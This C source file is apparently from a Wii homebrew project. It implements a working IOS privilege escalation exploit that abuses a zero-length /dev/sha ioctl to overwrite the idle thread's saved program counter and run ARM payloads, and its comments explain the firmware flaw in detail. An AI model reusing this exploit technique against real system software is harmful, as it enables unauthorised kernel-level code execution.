/*
    privilege.h - IOS privilege escalation exploit

    Copyright (C) 2025  Retro Rewind Team

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

    The exploit used in this program to elevate privileges is adapted from
    wfc-patcher-wii, which is licenced via GPL-2-or-later.
    See <https://www.gnu.org/licenses/> for license details.

    See https://github.com/WiiLink24/wfc-patcher-wii/blob/main/README.md
*/

#include <gccore.h>

#include "privilege.h"
#include "payload.h"
#include "../util.h"
#include "../time.h"

/* We don't need to run any exploits if we are running within Dolphin, so check for it when necessary. */
static bool _rrc_privilege_is_dolphin()
{
    static int is_dolphin = -1;

    /* THis will always be one or the other */
    if (is_dolphin == -1)
    {
        /* Recent versions have the /dev/dolphin device file */
        s32 fd = IOS_Open("/dev/dolphin", 0);
        if (fd >= 0)
        {
            IOS_Close(fd);
            is_dolphin = true;
        }

        /* Older Dolphin versions lack the /dev/sha device file.
        Ironically, the lack of this file makes it impossible to run the exploit anyway ;-) */
        fd = IOS_Open("/dev/sha", 0);
        if (fd >= 0)
        {
            IOS_Close(fd);
            is_dolphin = false;
        }

        is_dolphin = fd == IPC_ENOENT;
    }

    return is_dolphin;
}

void rrc_privilege_write_vu32(u32 *addr, u32 value)
{
    *(volatile u32 *)((u32)addr | 0xC0000000) = value;
}

u32 rrc_privilege_read_vu32(u32 *addr)
{
    return *(volatile u32 *)((u32)addr | 0xC0000000);
}

void rrc_privilege_mask_vu32(u32 *addr, u32 clear, u32 set)
{
    u32 temp = rrc_privilege_read_vu32(addr);
    temp &= ~clear;
    temp |= set;
    rrc_privilege_write_vu32(addr, temp);
}

struct rrc_result rrc_privilege_send_exploit()
{
    if (_rrc_privilege_is_dolphin())
    {
        return rrc_result_success;
    }

    s32 shafd = IOS_Open("/dev/sha", 0);
    if (shafd < 0)
    {
        char out[64];
        snprintf(out, sizeof(out), "Failed to open /dev/sha: IOS_Open returned %i", shafd);
        return rrc_result_create_error_io(out);
    }

    // Set up payload and make sure branches go to the correct places
    u32 *mem1_lo = (u32 *)0x80000000;
    memcpy(mem1_lo, armstage0, sizeof(armstage0));
    // Set destination of branch from THUMB stub properly
    mem1_lo[7] = (u32)armstage1 - 0x80000000;
    // Same here
    armstage1[7] =
        ((u32)armstage1 - 0x80000000) + sizeof(armstage1);
    rrc_invalidate_cache(&armstage1[0], 32);

    ioctlv vec[4] __attribute__((aligned(32))) = {0};
    vec[0].data = NULL;
    vec[0].len = 0;

    // Due to the length being 0, the memory bounds check performed by IOS will
    // not fail here. Without checking the length, the SHA-1 Init call will
    // write the following words to the destination:
    //
    // 00: 67452301
    // 04: EFCDAB89
    // 08: 98BADCFE
    // 0C: 10325476
    // 10: C3D2E1F0
    // 14: 00000000
    // 18: 00000000
    //
    // The zero words are useful here, because due to a flaw in the design of
    // IOS, 0 and NULL always point to the beginning of MEM1, an area controlled
    // by PPC. Most exploits utilize this by overwriting the LR on the stack to
    // jump to the beginning of MEM1, however we can go a step further...
    //
    // For whatever reason the thread that handles /dev/sha runs in ARM system
    // mode. This means that all kernel-only or read-only memory is now mapped
    // as read/write. We can use this to instead attack the context of the idle
    // thread, which is always located at 0xFFFE0000 in every version of IOS and
    // also runs in system mode, making our exploit much more stable.
    //
    // We want to write one of the 0 words to the stored PC at 0xFFFE0040, so
    // here we subtract that by 0x18, trashing various other registers that
    // don't matter in the process.
    vec[1].data = (void *)0xFFFE0028;
    vec[1].len = 0;

    // This vector is unused by this specific call, so we will utilize it for
    // invalidating the dcache on the IOS side. Cache safety is important here;
    // see the CTGP-R Channel installer freezing due to a battle with the cache.
    vec[2].data = mem1_lo;
    vec[2].len = 32;

    // This actually does the exploit
    s32 exres = IOS_Ioctlv(shafd, 0, 1, 2, vec);

    IOS_Close(shafd);

    // The exploit failed :-(
    if (exres != 0)
    {
        // Tell Starlet we are done - this writes to MESSAGE_VALUE
        rrc_privilege_write_vu32(&armstage1[8], 1);

        char out[64];
        snprintf(out, sizeof(out), "Exploit failed: IOS_Ioctlv returned %i", exres);
        return rrc_result_create_error_io(out);
    }

    rrc_time_tick now = gettime();
    // Wait for HW_SRNPROT to update
    while (rrc_privilege_read_vu32((u32 *)0x0D4F0000) != 0xE59FF018)
    {
        if (diff_msec(now, gettime()) >= 1000)
        {
            return rrc_result_create_error_io("Exploit failed: timeout waiting for HW_SRNPROT to update");
        }

        usleep(1000);
    }

    return rrc_result_success;
}

struct rrc_result rrc_privilege_close_exploit(bool due_to_error)
{
    // Remove bus access - essentially revert the changes made by the exploit
    // We don't need to do this on Starlet since we granted PPC access to do this when
    // we did the exploit.
    rrc_privilege_mask_vu32((u32 *)0x0D800060, 0x08, 0);
    rrc_privilege_mask_vu32((u32 *)0x0D800064, 0x00000DFE, 0);
    rrc_privilege_mask_vu32((u32 *)0x0D800064, 0x80000000, 0);

    // Send finished message to ARM
    rrc_privilege_write_vu32((u32 *)(armstage1 + 8), 1);

    // If there was an error, bail early since we can't even guarantee Starlet will
    // ever respond
    if (due_to_error)
    {
        return rrc_result_success;
    }

    rrc_time_tick now = gettime();
    // Wait for response from ARM
    while (rrc_privilege_read_vu32((u32 *)(armstage1 + 8)) != 2)
    {
        if (diff_msec(now, gettime()) >= 1000)
        {
            return rrc_result_create_error_io("Exploit reset failed: timeout waiting for response from Starlet");
        }
    }

    return rrc_result_success;
}